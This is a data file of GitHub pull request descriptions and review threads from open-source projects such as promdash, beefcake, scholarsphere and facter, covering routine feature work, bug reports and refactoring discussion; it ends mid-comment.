460,prometheus/promdash,129.0,"Clone dashboard (OMG HAPPY FRIDAY!!!!)

requested in #80 ","[':+1: cool stuff, works like a charm.\r\n\r\nIt might be less surprising to wait with creating the cloned dashboard until the user has pressed the button in the edit form. Just so that they still have the option to cancel the process.', ""how's this look?"", 'Left a comment, but :+1: otherwise!']"
461,prometheus/promdash,107.0,"Add some generic filter functions for interpolation, and possible allow arbitrary passing of functions

addresses #103 ","['Haven\'t thought about this too deeply yet. I wonder if we\'re actually rebuilding Angular\'s expression parsing? http://docs.angularjs.org/guide/expression\r\n\r\nIs there a way to leverage that instead (""If you want to eval() an Angular expression yourself, use the $eval() method."").\r\n\r\nSeems like we\'d have to put all the timeseries labels into a scope, then eval an expression on that scope: http://docs.angularjs.org/api/ng/type/$rootScope.Scope#$eval And the functions would be AngularJS filters.', 'Gonna need you guys to test this one a fair bit...\r\n\r\nThere are a few basic filter functions: `toPercent`, `toInt`, and `hostname`. Cool. Where it gets interesting is with the `regex` filter.\r\n\r\narguments are separated by `:`, so `{{someAttr | regex:arg1:arg2}}`. Both `arg1` and `arg2` need to be strings.\r\n\r\n`arg1` is the argument for a javascript regex (`new RegExp(arg1, ""g"")`). Since it is being created with the regexp constructor, any escaped special sequence (`\\w`) needs to be double escaped (`\\\\w`).\r\n\r\n`arg2` is the replace string.\r\n\r\nThe regex I\'m using to parse `{{someAttr | regex:arg1:arg2}}` can definitely be improved. I added some support for some of the fancier operations, like lookaheads and negations (http://www.javascriptkit.com/javatutors/redev2.shtml)\r\n\r\nlookahead\r\n![screen shot 2014-04-01 at 7 40 20 pm](https://cloud.githubusercontent.com/assets/1398104/2585994/16e3d698-b9f7-11e3-8772-ee01f174df89.png)\r\n\r\nnegation\r\n![screen shot 2014-04-01 at 7 54 31 pm](https://cloud.githubusercontent.com/assets/1398104/2586108/0782914c-b9f9-11e3-8278-9f128ca7ddd6.png)\r\n\r\nchaining filters\r\n![screen shot 2014-04-01 at 8 15 27 pm](https://cloud.githubusercontent.com/assets/1398104/2586250/fcfada38-b9fb-11e3-9b28-45eeee959318.png)\r\n', ""Hey, apologies that I haven't been giving this full attention yet. Some other issues are more pressing right now, but I'll try to give it a really good look and thought tomorrow!"", ""This looks really promising. I'll test and review it this weekend.\r\n\r\nAnother default function I'd see to become handy: `toPercentile` which given a legend definition `{{ percentile | toPercentile }}` and a timeseries with the label `percentile=.99` returns `99th`."", ""Also I'd like to introduce the style guide of using spaces for expressions with functions in form of `{{ label | function }}` and not `{{label|function}}`. Opinions @stuartnelson3 @juliusv?"", ""I believe the regex that parses the {{}} will take both. Are you wanting to\nenforce this style for the users?\n\nOn Saturday, April 5, 2014, Tobias Schmidt <notifications@github.com> wrote:\n\n> Also I'd like to introduce the style guide of using spaces for expressions\n> with functions in form of {{ label | function }} and not\n> {{label|function}}. Opinions @stuartnelson3<https://github.com/stuartnelson3>\n> @juliusv <https://github.com/juliusv>?\n>\n> --\n> Reply to this email directly or view it on GitHub<https://github.com/prometheus/promdash/pull/107#issuecomment-39632155>\n> .\n>"", ""Hmm, whenever I add just something like `{{instance}}` to the legend format string, it logs this and no legend shows:\r\n\r\n```\r\nTypeError: Cannot call method 'split' of undefined\r\n    at http://localhost:3000/assets/application.js:10205:43\r\n    at Array.forEach (native)\r\n    at http://localhost:3000/assets/application.js:10199:17\r\n    at http://localhost:3000/assets/application.js:9652:20\r\n    at klass.forEach (native)\r\n    at formatTimeSeries (http://localhost:3000/assets/application.js:9648:16)\r\n    at Object.redrawGraph [as fn] (http://localhost:3000/assets/application.js:9718:9)\r\n    at h.$digest (http://localhost:3000/assets/application.js:114:466)\r\n    at h.$apply (http://localhost:3000/assets/application.js:117:264)\r\n    at f (http://localhost:3000/assets/application.js:81:120)\r\n```"", '@grobie does this work as you want it to?', ""@stuartnelson3 heya, there's still the outstanding comment about using a separate scope for the expression evaluation magic."", ""I'm still getting `Error: [$injector:unpr] http://errors.angularjs.org/1.2.12/$injector/unpr?p0=tFilterProvider%20%3C-%20tFilter` Javascript errors when playing around with the expressions too much. For example, during typing, `{{quantile | toPercent | t}}` might be an invalid intermediary expression, but it shouldn't result in a JS error. It should probably just show `undefined` or something as the evaluation result."", ""Ok, another bug report: `{{quantile | toPercent}} {{quantile | toPercent}}` now returns formatted strings like: `90% {{quantile | toPercent}}`. That is, only the first interpolated expression in the format string is evaluated. If the first expression isn't piped, the second one works though. `{{quantile}} {{quantile | toPercent}}` returns `0.9 90%` (correct)."", 'That should be resolved now', ""What's the state of this PR? What happened to the tests?"", ""I think it's ready to go out, unless @juliusv finds another bug\r\n\r\nRegarding the tests: I haven't successfully been able to set up dependency injection for angular tests. Since the `VariableInterpolator` now has `$rootScope` injected into it, the tests blow up. If this passes QA, and so does the stacked graph error in #142, then I'll be on to improving testing, which this will be a part of. "", "":+1: Can't find any bugs anymore :) Let's get this squashed&merged and go on to... TESTING!!!"", ':+1: ', ""Cool! :100: Let's see how we can teach angular to be testable :)""]"
462,prometheus/promdash,360.0,requested in #352,"['@juliusv @grobie poke', 'updated', ""If I understand the PR correctly, this will refresh the graph when pressing enter in an expression input field. Can we also trigger a refresh when the input field loses it's focus?"", ""Do we want to make that assumption? I wouldn't expect that behavior, personally."", ""Me neither... if it loses focus, I might not even be finished typing my\nexpression, but copy/pasting stuff from somewhere else, etc.\n\nOn Tue, Mar 10, 2015 at 6:08 PM, stuart nelson <notifications@github.com>\nwrote:\n\n> Do we want to make that assumption? I wouldn't expect that behavior,\n> personally.\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/prometheus/promdash/pull/360#issuecomment-78099954>.\n>\n"", ""What downsides do you see? Why wouldn't you expect it?\n\nIf I edit an expression I expect the graph to reflect the changes I made.\nAs refreshing after every change is too noisy and error-prone, we need\nclear signals when to trigger a refresh. Pressing ENTER is one of them,\nleaving the field seems to be the most common one?\n\nThe refresh should probably only be triggered if the input field content\nhas actually changed.\n\nOn Tue, Mar 10, 2015 at 1:08 PM, stuart nelson <notifications@github.com>\nwrote:\n\n> Do we want to make that assumption? I wouldn't expect that behavior,\n> personally.\n>\n> --\n> Reply to this email directly or view it on GitHub\n> <https://github.com/prometheus/promdash/pull/360#issuecomment-78099954>.\n>\n"", ""I see, fair enough. I'll train to hit enter then.\n\nOn Tue, Mar 10, 2015 at 1:19 PM, Julius Volz <notifications@github.com>\nwrote:\n\n> Me neither... if it loses focus, I might not even be finished typing my\n> expression, but copy/pasting stuff from somewhere else, etc.\n>\n> On Tue, Mar 10, 2015 at 6:08 PM, stuart nelson <notifications@github.com>\n> wrote:\n>\n> > Do we want to make that assumption? I wouldn't expect that behavior,\n> > personally.\n> >\n> > --\n> > Reply to this email directly or view it on GitHub\n> > <https://github.com/prometheus/promdash/pull/360#issuecomment-78099954>.\n>\n> >\n>\n> --\n> Reply to this email directly or view it on GitHub\n> <https://github.com/prometheus/promdash/pull/360#issuecomment-78102220>.\n>\n"", 'Hm, btw. what about pie charts?', '~~promdash has pie charts?~~\r\n\r\nI mean, pie charts have been there the whole time. @juliusv.', ""Ok, one last thing: when adding a new pie chart, it has one (empty) expression by default. That is good (and the graph should actually be changed to also have one initial expression after creating), but we should ignore empty expressions during graph refreshes, as they'll otherwise generate errors. Right now, when you create a pie chart, you immediately get an error..."", 'updated', 'Hm, but the problem with the pie chart empty expression error (and empty expression errors in general remains)?', 'What is the problem? Do you not want the user to be able to make a request if the input is empty? \r\n\r\nI thought the issue was that when changing servers it would force a refresh, which no longer occurs if the expression box is empty', ""The problem is:\r\n\r\n- create a new pie chart\r\n- you get an error `Error parsing rules at line 1, char 1: syntax error` because the initial expression is empty\r\n\r\nSo I think empty expressions should always be ignored in any case, yes. Then I meant relatedly (but optional for this PR) that it would be great to also add an initial (empty) expression to a new graph, as that wouldn't trigger an error anymore if we ignore empty expressions for queries."", ""when do you get the error? i create a new pie chart, select a server, and get no error. i only get an error when i force a refresh. grab me when you're free."", 'I get the error immediately when clicking the ""Add Pie Chart"" button with no further interaction required... unfortunately I\'m WFH today because a maintenance person needs access.', 'ah, i do not get that. try clearing your cache, repulling the branch, etc, etc...', 'Did both, including hard-refresh in incognito mode :)\r\n\r\n```\r\n$ git rev-parse HEAD                  \r\n668a1d090203e063c2b0f4c3492c2a8f7ca5c5ec\r\n```\r\n\r\nMy PromDash has a single server configured, and if I create a completely new dashboard and immediately click ""Add pie chart"", I get that error. Anyways, if you can\'t reproduce it, we can take a look at it tomorrow, when I\'m back in the office.', ""yeah, just followed your steps and can't reproduce it. catch up with you tomorrow."", ""@stuartnelson3 Funny, it doesn't happen on my work laptop either. Guess you'll need to come to my place finally to see the problem on my desktop one :) I'll check again at home to see what the difference is."", 'computers, amirite?', ""Found the reason: https://github.com/prometheus/promdash/blob/master/app/assets/javascripts/angular/controllers/dashboard_ctrl.js#L158\r\n\r\nWhen you have a server with ID 1, it will be selected by default and you'll get an error. That shouldn't happen (either don't select any server by default or always ignore empty expressions and preselect the first available server - the latter is the best solution IMO)."", 'ah k.\r\n\r\nthe first server should be selected by default now, and `changeExpression` will only be emitted if the pie chart has an expression to evaluate.', ""Hmm, I'm still getting an error about the empty expression when adding a new pie chart. Stop by my desk in case you can't reproduce it..."", 'finally got the error, no idea what was wrong with my machine. when you get a chance let me know if this *finally* fixes it', '@stuartnelson3 Hum, nope, still getting the error. Wanna come over and take a look?', '@juliusv copacetic?', 'Yup :+1: ']"
463,prometheus/promdash,426.0,"Annotations requests are cached based on the dashboard's endTime and
range. If the dashboard has no set endTime (i.e. the annotation endTime
requested will keep changing), the cache for that range+endTime
combination is erased every 5 minutes.

Previously, annotations were requested every time for each individual dashboard.

@juliusv @grobie ","['@juliusv hey, made it so all queries are cleared from the cache after 1min, and moved `Rails.configuration.path_prefix` to a global', ':+1:']"
464,promiscuous-io/promiscuous,70.0,We use a ConsumerGroup on the subscriber side to allow for multiple consumers per topic.,['lgtm']
465,protobuf-ruby/beefcake,28.0,"This is part of the output of running the generator from 67f4894e4a77bac6e3b5953ca51f2de12127fff7 against https://github.com/basho/riak_pb/blob/master/src/riak_kv.proto :
```ruby

class RpbContent
  include Beefcake::Message


  required :value, :bytes, 1
  optional :content_type, :bytes, 2
  optional :charset, :bytes, 3
  optional :content_encoding, :bytes, 4
  optional :vtag, :bytes, 5
  repeated :links, RpbLink, 6
  optional :last_mod, :uint32, 7
  optional :last_mod_usecs, :uint32, 8
  repeated :usermeta, RpbPair, 9
  repeated :indexes, RpbPair, 10
  optional :deleted, :bool, 11

end

class RpbLink
  include Beefcake::Message


  optional :bucket, :bytes, 1
  optional :key, :bytes, 2
  optional :tag, :bytes, 3

end
```
The issue is that `RpbContent.links` cannot be defined, because it depends on the `RpbLink` class that hasn't been read yet.

What I'll try and do this week is find a way to create all the classes up front, so they all exist when they try to get tagged in messages.","['This includes and supersedes #27 .', 'Hi, @bkerley!  @bmizerany and I spoke a week ago about maintainership, and we have transitioned Beefcake to the @protobuf-ruby group on GitHub.\r\n\r\nI would like to review your pull request, but it looks out of date.  Can you rebase?  ', 'Hey, so overall this looks OK.  Would you be willing to include inline a before-and-after of the generated code or include them in Gist for review?  I would like to compare this a bit more precisely.\r\n\r\nWithout having the diff, I am curious, why not output the messages with a [topological sort](http://ruby-doc.org/stdlib-1.9.3/libdoc/tsort/rdoc/TSort.html) instead of defining the class specification a priori?', 'Just force-pushed the rebase, will generate before & after.', 'https://gist.github.com/bkerley/6284225 contains before and after. The issue this branch fixes is at https://gist.github.com/bkerley/6284225#file-before-riak_kv-pb-rb-L221', 'Taking a look at the jruby failure on travis: https://travis-ci.org/protobuf-ruby/beefcake/jobs/10417342', 'Just a few open questions in https://github.com/protobuf-ruby/beefcake/pull/28/files.', ""Almost ready for submission.  Just take care of the last simple remarks, and we're good to merge."", 'LGTM.  Thank you for your work and patience and thoroughness!']"
466,pry/pry,1156.0,This simplifies the test rake task and will guard better against regressions.,['looks good to me.']
467,psu-stewardship/scholarsphere,18.0,,"['@cam156 This should be ready to go, though @mtribone will certainly want to change styling.']"
468,psu-stewardship/scholarsphere,32.0,Created SCSS partials for ScholarSphere theme and tweaked a bit of HTML for smaller screen sizes.,"[""We're overriding a good number of Sufia's views here.  Should these changes, or a subset of them, be done in Sufia instead so that our upgrade path doesn't become more brittle?  I get overriding Sufia's views for features that only exist in ScholarSphere, like proxies/transfers, but I'm not sure why we need these view overrides."", '@mjgiarlo When I first discussed this work with some members of the team, they felt that doing the work in ScholarSphere would help us move forward more quickly with our deadline\xe2\x80\x93code freeze. The overrides are to refactor the previous ""wireframe"" model for one that ""pops"" and it required a little tweaking for using Bootstrap panels and such and some grid tweaks for display issues. ', 'For sure it\'ll help us move forward more quickly.  I\'m OK with intentionally creating technical debt as long as we have a plan for paying it down (and giving back to the community, as I\'m guessing they\'ll want Sufia to have a UI that pops) -- maybe that\'s as simple as ""let\'s ticket items like this in Redmine and devote a post-2.0 launch sprint to moving sphere stuff back into Sufia.""\r\n\r\nI wonder what @jcoyne thinks about how mergeable the above would be if moved over to Sufia.', '@mjgiarlo Yeah, man. I have a tan, vermilion, teal, yellow dashboard  theme ready to go that would make Sufia look awesome. Yes to planning and yes to seeing how merge-able these changes are\xe2\x80\x93sans the color scheme.', ""Why sans the color scheme?\r\n\r\nOK, so will you put in the Redmine ticket to shift this over to Sufia?  Or do you want to hear from @jcoyne first?\r\n\r\nI'm not trying to drag this out, really -- I just don't want us to make headaches for ourselves later unless we really need to."", '@mjgiarlo Sans the Penn State color scheme, but with another color scheme. ', ""@mjgiarlo I'm definitely with @mtribone on this.  He is busy and we need to hit the deadline.  If you would like to refactor this PR into Sufia this week before we pin feel free, but the rest of us are working accessibility, which takes a higher priority.  How about we add a ticket into Sufia for the updates?  Do we have a succinct list of what this fixed to describe the ticket? Or we could just point at the commit..."", ""I think it'd be A-OK to add a ticket into Sufia, as long as we prioritize coming back to it at some point before it gets stale.  I think pointing at the PR URL is perfectly fine.""]"
469,psu-stewardship/scholarsphere,38.0,"Branch adds the ability for final release to maintain itself as a git repository versus utilizing git archive to deploy the final release.

Also added 'rbenv_install' capistrano plugin which includes the ability to install rbenv, bundle, and ruby.","['Do we need the empty .capignore file?', 'Hey @pcrum!  I left a handful of comments, and Travis is currently showing failing tests.  Once you get tests passing, can you squash your commits?  Thanks for the PR.', ""Hey @mjgiarlo , I believe I've corrected the formatting. Please take a look when you have a moment. Thanks"", ""Looks great, @pcrum!  I believe the Travis error above is unrelated to this work, so I'm inclined to merge this.  Thoughts, @cam156 @hectorcorrea @awead @mtribone?"", ""@mjgiarlo @pcrum I agree that the error does not seem to be related to the changes. I've restarted the build and will check again in 20 or so minutes."", ':clap: ', ""Looks good to me, I'm pulling the trigger."", ':+1: @pcrum']"
470,psu-stewardship/scholarsphere,70.0,...677,"['Why is this stuff in `lib/devise`?', 'I have no idea.  The ticket was to add back in previous functionality, but I can move it...']"
471,psu-stewardship/scholarsphere,73.0,"Addresses RedMine ticket 9740 
https://scm.dlt.psu.edu/issues/9740",['I will re-submit this PR with a different target branch. ']
472,psu-stewardship/scholarsphere,78.0,"This pull request adds a few rake tasks to audit the migration of objects from Fedora 3 to Fedora 4. The idea is that these tasks will be run after deploying the Fedora 4 code base to production and immediately after the migration of data has been performed.

The code to perform the audit issues straight HTTP requests to Fedora 3 and Fedora 4 and bypasses Rubydora and ActiveFedora to make sure we query the Fedora repo as close to the metal as possible. 

The following Wiki page provides some information on how these rake tasks will be run in production: https://github.com/psu-stewardship/scholarsphere/wiki/Fedora-3-to-Fedora-4-Migration ","[""@awead @cam156 @mjgiarlo This is the latest on the code to audit the Fedora 3 to Fedora 4 migration. \r\n\r\nThis code includes the suggestions that Adam made earlier this week (on a PR that I deleted.) Notice that I only added unit tests to test the code from the Fedora 4 point of view since I didn't want to be running tests against both Fedora 3 and Fedora 4 in the same code base. \r\n\r\nThe unit tests stub the results that the Fedora 3 repo will have and then creates them in Fedora 4 and compares the two. "", ""@cam156 @mjgiarlo so I went :banana: :banana: :banana: with the comments. I want to say that overall, I'm :100: :+1: with this _as is_. I was just exercising a bit here, in case @hectorcorrea wanted some deeper level comments. Feel free to provide additional suggestions.\r\n\r\nThe only thing I'm not sure of are all the changes to `schema.rb` but that's just me. If we want to pull this code out eventually, that might make the schema a little weird to deal with later, but I'm not too familiar with this on the Rails side.\r\n\r\nIt's now :hourglass: and time for :cocktail: "", "":+1: to @awead's comments! These are useful pointers. Thanks for whipping this up and working through the PR process, @hectorcorrea"", '@awead @mjgiarlo I\'ve implemented most of the suggestions that @awead provided. Thanks a lot for the comprehensive feedback. I also removed a few hash rockets that you guys missed ;) \r\n\r\nThe suggestions that I didn\'t implement are the ones that were along the lines of ""reduce these the 3 lines to a single line"" when I thought the assignment of the variables line by line made the code clearer (and easier to debug) than the suggested single line approach. \r\n\r\nI also left a few string concatenations in place (instead of replacing them with string interpolation) when I thought the concatenation made the operation easier to read.', ':clap: ']"
473,psu-stewardship/scholarsphere,79.0,Fixes https://scm.dlt.psu.edu/issues/9786 by rendering 404 on ActiveFedora::RecordNotFound,"['Travis :volcano: ', ""Last comment: I know we don't have and probably don't want the huge block o' `rescue_from`s in Sufia, but I might like to see this issue tested and fixed in Sufia proper."", ""@mjgiarlo @cam156 give this another :eyeglasses:  I've pulled out the other three commits that weren't relevant."", '@cam156 @mjgiarlo this is ready for a merge', ""I'm :+1: \r\n\r\n@cam156 ?""]"
474,psu-stewardship/scholarsphere,80.0,"This was fixed in Sufia, but I avoided putting the follow-up test as a feature, since that would require uploading files and would slow down the test suite. Instead, the size property on the file is mocked in a unit environment, similarly to the way it is in the Sufia test.",['@cam156 @mjgiarlo updated!']
475,psu-stewardship/scholarsphere,123.0,...s #119,[]
476,puppetlabs/facter,512.0,"In order to install in the top-level site_ruby directory, we need to clean out
any installs in the old site_ruby/1.8 location. We're doing this by setting a
variable in the package:apple task. If it's set, we remove all files there as
well as files in the new location.

While I'm here:
* update erb to strip leading and trailing spaces
* validate critical variables so a script is never generated with dangerous paths
* only target top-level files/dirs in lib, since we're doing rm -RF anyway","['CLA signed by all contributors.', 'Please take another look.', '+1 ']"
477,puppetlabs/facter,405.0,"Without this patch the solaris zones fact executes `/usr/sbin/zoneadm list -cp`
on all systems.  This behavior is not confined to SunOS systems.  This is a
problem because this creates noise for the end user.

The root cause of the problem is that the block passed to the Resolution
instance executes before the confinement statement takes effect.  In the scope
of this block is a call to Resolution.exec('/usr/sbin/zoneadm list -cp').

This patch addresses the problem by moving the behavior for defining the set of
dynamic facts into the Facter::Util::SolarisZones.add_facts class method.  This
method is called only when running on the SunOS kernel.

The add_facts method has the behavior of instantiating an instance of
SolarisZones to model the output of the zoneadm command.  We model this output
because the system command is extremely expensive from a performance and
efficiency point of view.  All of the dynamic facts that are defined as a
result of parsing the zoneadm output retain a reference to this single model
instance.  In the situation where one, many, or all of the fact values are
flushed then the model instance is also flushed.  The first fact to resolve
again will refresh the model and all subsequent resolutions will re-use the
data contained in the model.

It is not uncommon to have 10 or more zones defined on a system and there are 7
dynamic facts generated for each zone.  Without this shared model instance it
is unclear how to avoid executing 10*7 system calls when all of the dynamic
cache values are flushed.
","['This should be ready for review now.', ""@zaphod42 I've addressed all of your comments from yesterday.  Please let me know if you have any more or if you +1 this change set.\r\n\r\nThis change set is the last remaining issue blocking the 1.7.0 release.\r\n\r\n-Jeff"", 'Merged into 1.7.x as 2223fda.\r\n\r\nThis should be released in Facter 1.7.0.\r\n\r\nThanks again for the contribution!\r\n\r\n-Jeff']"
478,puppetlabs/facter,436.0,"Rackspace Cloud doesn't expose the metadata service provided by OpenStack.  You can get some basic information about region and what the instance id is from xenstore, though","['CLA Signed by katzj on 2011-12-28 21:00:00 -0800', ""Thank you very much for this contribution!\r\n\r\nI've added a number of inline comments and questions on how this could be improved. In addition it would be good to have unit tests for this so that we can prevent regressions. If you would like help with this, IRC would be one of the best ways to get ahold of me. I'm generally available on irc.freenode.net from 9:00 AM - 5:00 PM in #puppet and #puppet-dev, and my nickname is finch.\r\n"", ""Here's an updated patch that should address things and also adds a basic set of unit tests"", 'summary: merged into master in 87c42e3. This should be released in Facter 2.0.0. Thanks!']"
479,puppetlabs/facter,423.0,"@jeffmccune I've recreated this pull-request and fixed the previous method missing issue. Sorry about that.

I can't view the failed CI job. Is there any way I can launch a CI job so I can test myself?

For recording purposes, here's a link to the old pull: https://github.com/puppetlabs/facter/pull/406","[""I've also rebased this against master again."", ""@razic Thank you for contributing to Puppet!  I'm reviewing this now, thanks for rebasing it."", ""(addressed)\r\n\r\n@razic Thanks, this is looking good, however we can't yet merge this as is.  The next actions are to first pare down all of the public API methods to those that are truly designed and implemented to be used by 3rd party custom facts and not just core facts.\r\n\r\nSecond, we need to make sure that interfaces which are created or removed during the life of a process that has loaded Facter will be accurately reflected in the results.  It seems that the `interfaces` local variables aren't ever refreshed, and the calls to `Facter::Util::IP.interfaces` which define facts are only ever called once when the file is loaded and not on subsequent fact value flushes."", ""@jeffmccune I've taken care of making the incorrectly marked API methods to be private.\r\n\r\n I've also honored the on_flush callback for the facts in the same manner as e4eb583.\r\n\r\nIt's passing CI and I was able to run it on my system, but I now seem to have fucked up something on my machine and can't run the Facter binary anymore.\r\n\r\nWhat is the preferred way of running it? I've tried `bin/facter` and uninstalling the gem and reinstalling it from the gemspec to no avail."", 'This is also rebased already.', 'Reviewing this presently, thanks for addressing the comments.', 'awesome :+1: ', 'I\'m going to have to pick this up after dinner or tomorrow morning, people are getting hungry around here.  This is looking good, though I want to investigate two things.  First, some of the examples are spewing out, ""no facts loaded"", and second I notice one of the examples is taking a couple of seconds to run.  I\'d like to see if both of those can be improved, or if they\'re non-issues.', ""sounds good. i was also wondering why the 'no facts loaded' was being spewed out of the tests, but if i remember correctly, it was there before i even started this pull.\r\n\r\nwhich example is taking a couple seconds to run?"", ""@razic I'm going to be out on vacation today and Friday, there's a chance I won't have this reviewed again until Monday.  Sorry about the delay, we've been working hard to get Puppet 3.2 ready for an RC which took a bit of time this week."", ""No problem! Thanks for letting me know :))\r\n\r\nOn Apr 18, 2013, at 20:37, Jeff McCune <notifications@github.com> wrote:\r\n\r\n> @razic I'm going to be out on vacation today and Friday, there's a chance I won't have this reviewed again until Monday. Sorry about the delay, we've been working hard to get Puppet 3.2 ready for an RC which took a bit of time this week.\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub."", 'Finally back onto this contribution.  Sorry about the delay.', 'summary: merged into master as c028d61, this refactoring of the IP module and related facts will be released in the next minor or major release of Facter.  This will likely be Facter 2.  Thanks for the great contribution and clean up @razic.', ""summary: @razic Unfortunately we had to revert this refactoring because the Windows acceptance tests failed as a result of them being merged last night.  Here's a link to the failure: [Build failed in Jenkins: Puppet Acceptance Windows (master) \xc2\xbb acceptance #429](https://groups.google.com/d/msg/puppet-ci/KsIf_DSGxuU/tnwhtrFPSRUJ)  Since this pull request has been merged into the history, and then reverted, the next actions are to submit another pull request that reverts commit af37f4d (this reverts the revert), then fix up the issue uncovered by the acceptance test?\r\n\r\nThere's a lot of output, but the line to look for is.\r\n\r\n```\r\nCould not retrieve local facts: undefined method `get_interfaces' for Facter::Util::IP:Class\r\n```\r\n\r\nPlease let me know if you'd like some help testing this on Windows.  I'll see what resources we have that we could make available.\r\n\r\nCheers,\r\n-Jeff"", '@jeffmccune I don\'t believe this is an issue with the code but rather an issue with the Windows environment. My reason for this belief is twofold. I have received the very same stack trace when I had been installing `facter` using `install.rb` alongside my global installation instead of building the gem manually and running it from my `.bundle` bin stubs. In other words, I do believe there is a rogue installation of an older `facter` running on the Windows environment which caused this stack trace.\r\n\r\nI further this belief because I removed all instances of `get_interfaces` including method definitions and method calls during this refactor. This can be illustrated using `ack` or `grep`:\r\n\r\n```sh\r\nrazic at razic in ~/razic/facter on master\r\ng remote add upstream git://github.com/puppetlabs/facter\r\n\r\nrazic at razic in ~/razic/facter on master\r\ng fetch upstream\r\nremote: Counting objects: 287, done.\r\nremote: Compressing objects: 100% (164/164), done.\r\nremote: Total 228 (delta 146), reused 140 (delta 64)\r\nReceiving objects: 100% (228/228), 47.42 KiB, done.\r\nResolving deltas: 100% (146/146), completed with 39 local objects.\r\nFrom git://github.com/puppetlabs/facter\r\n * [new branch]      1.6.x      -> upstream/1.6.x\r\n * [new branch]      1.7.x      -> upstream/1.7.x\r\n * [new branch]      gh-pages   -> upstream/gh-pages\r\n * [new branch]      integration/fact_definition -> upstream/integration/fact_definition\r\n * [new branch]      master     -> upstream/master\r\n * [new branch]      stable     -> upstream/stable\r\n * [new tag]         1.7.0      -> 1.7.0\r\n * [new tag]         1.7.0-rc2  -> 1.7.0-rc2\r\n\r\nrazic at razic in ~/razic/facter on master\r\ng checkout upstream/master\r\nNote: checking out \'upstream/master\'.\r\n\r\nYou are in \'detached HEAD\' state. You can look around, make experimental\r\nchanges and commit them, and you can discard any commits you make in this\r\nstate without impacting any branches by performing another checkout.\r\n\r\nIf you want to create a new branch to retain commits you create, you may\r\ndo so (now or later) by using -b with the checkout command again. Example:\r\n\r\n  git checkout -b new_branch_name\r\n\r\nHEAD is now at af37f4d... Merge branch \'revert_ipmodule_refactor\'\r\n\r\nrazic at razic in ~/razic/facter on (af37f4d...)\r\ng l\r\n*   af37f4d (HEAD, upstream/master) Merge branch \'revert_ipmodule_refactor\'\r\n|\\\r\n| * 4030518 Revert ""Merge branch \'razic-fix/2.x/17710_ipmodule_refactor\'""\r\n| * b409787 Revert ""(maint) Replace rspec >= 2.11 expect(foo).to with foo.should""\r\n|/\r\n* f83db16 (maint) Replace rspec >= 2.11 expect(foo).to with foo.should\r\n*   c028d61 Merge branch \'razic-fix/2.x/17710_ipmodule_refactor\'\r\n|\\\r\n| * 7ac859d (maint) Remove focus tag from ec2 specs\r\n| * cc67a35 (maint) Silence no facts loaded warning in specs\r\n| * 79653bc (maint) Fix Facter::Util::IP.exec_ifconfig examples\r\n| * a8f37a7 (maint) Avoid executing ifconfig from the specs\r\n| * 5480484 (#17710) Refactor the IP module\r\n|/\r\n\r\nrazic at razic in ~/razic/facter on (af37f4d...)\r\ngit reset --hard head^\r\nHEAD is now at f83db16 (maint) Replace rspec >= 2.11 expect(foo).to with foo.should\r\n\r\nrazic at razic in ~/razic/facter on (f83db16...)\r\nack get_interfaces .\r\n\r\nrazic at razic in ~/razic/facter on (f83db16...)\r\ngrep -r get_interfaces .\r\n```\r\n\r\nWe\'re so close to getting this one in :smile: \r\n\r\nLet me know if I\'m mistaken or if there\'s anything I can do to get this working.', ""@razic Thanks for the detailed information, I (or we) will definitely take a look at this ASAP and double check everything.\r\n\r\nI really appreciate the quick response, I've been a bit slow to respond because we're juggling some issues in the critical path of Puppet 3.2 as well.  I'm determined to get these IP facts cleaned up one way or another."", ""@jeffmccune No problem :palm_tree: I'm always around for quick replies. Let me know after you've done a little bit of investigation."", '@jeffmccune just bumping this :) anything i can do to help?', ""On Thu, May 2, 2013 at 12:44 AM, Zachary Adam Kaplan <\nnotifications@github.com> wrote:\n\n> @jeffmccune <https://github.com/jeffmccune> just bumping this :) anything\n> i can do to help?\n>\n\nThanks, I haven't lost sight of it!  I'm really sorry, we've been working\nhard to try and get the next release candidate of Puppet 3.2 ready which is\nwhy this pull request hasn't made it to the top of my list this week.\n We'll definitely get to it as soon as possible.\n\n-Jeff"", 'cool. thanks :+1: ', ""Still haven't forgotten about this.  =)"", ""Hehe alright sweet. Thanks for letting me know. Let me know if there's anything I can do to help. \r\n\r\nOn May 14, 2013, at 10:32, Jeff McCune <notifications@github.com> wrote:\r\n\r\n> Still haven't forgotten about this. =)\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub."", ""@adrienthebo @hkenney I've completely failed to act on this pull request the past few weeks and it's largely been stuck, blocked on me.  Could you please take a look at this sometime before Friday if I still haven't picked it up?  I know it's a big one, but the current code it's improving is already pretty messy and we can always revert it if there's a regression."", ""@jeffmccune\r\n\r\nThis pull shouldn't really require any more review since it was already reviewed and merged. I have not made any additional changes. The reason it was reverted was because it failed the CI job to what I believe was a faulty CI run on Windows (see my earlier comments as to why).\r\n\r\nOn May 14, 2013, at 10:56, Jeff McCune <notifications@github.com> wrote:\r\n\r\n> @adrienthebo @hkenney I've completely failed to act on this pull request the past few weeks and it's largely been stuck, blocked on me. Could you please take a look at this sometime before Friday if I still haven't picked it up? I know it's a big one, but the current code it's improving is already pretty messy and we can always revert it if there's a regression.\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub."", '@hkenney @jeffmccune @adrienthebo let me know if there is anything else.', ""So it looks like this is causing some test failures now, all of them are in `spec/unit/util/ip_spec.rb` and it looks like they're all caused by the same thing: \r\n\r\n```\r\nFailure/Error: Facter.value(:interfaces)\r\n     NoMethodError:\r\n       undefined method `kernel_supported?' for Facter::Util::IP:Class\r\n```\r\n\r\nAnd it looks like this is happening in a regular Facter run too:\r\n\r\n```\r\n$ bundle exec facter\r\nError: undefined method `kernel_supported?' for Facter::Util::IP:Class\r\n```\r\n\r\nI suspect you might already be aware of this though. Can I do anything to help with debugging and/or generally make your life easier?"", ""Additionally, I am on the puppet-dev IRC channel now as hkenney. I'm still not sure how helpful I would be in real time, but I can definitely try!"", ""@hkenney sorry that was totally a mistake on my end. it was late and i tried calling a instance method on the class.\r\n\r\ni've fixed it now and ran the specs to make sure it works.\r\n\r\ndo you have a windows machine/VM accessible? can you try running this pull request on that VM? the main reason this pull request was reverted was because it failed a CI run on windows but I do believe that was an incorrect CI run.\r\n\r\nWhat is your IRC name?"", ""Yup, I set up a Windows VM, so my next step is to try this out on that and see if there's any issues. \r\n\r\nAlso, my IRC name is the same as my GitHub: hkenney (I think). That's at least how it's showing up in puppet-dev."", 'So I noticed the pending 